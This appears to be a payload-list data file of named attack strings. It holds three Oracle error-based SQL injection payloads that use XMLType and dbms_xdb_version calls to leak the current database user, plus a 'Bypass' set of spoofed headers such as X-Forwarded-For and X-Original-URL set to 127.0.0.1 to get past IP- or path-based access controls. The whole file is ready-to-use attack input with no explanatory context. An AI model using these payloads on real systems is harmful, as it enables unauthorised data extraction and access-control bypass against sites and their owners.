values.name: Ora_error
values.value: and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null;

values.name: Ora_error3
values.value: and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null;

values.name: Ora_error4
values.value: and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null;

values.name: Bypass
values.value:
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /
X-Rewrite-URL: /
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
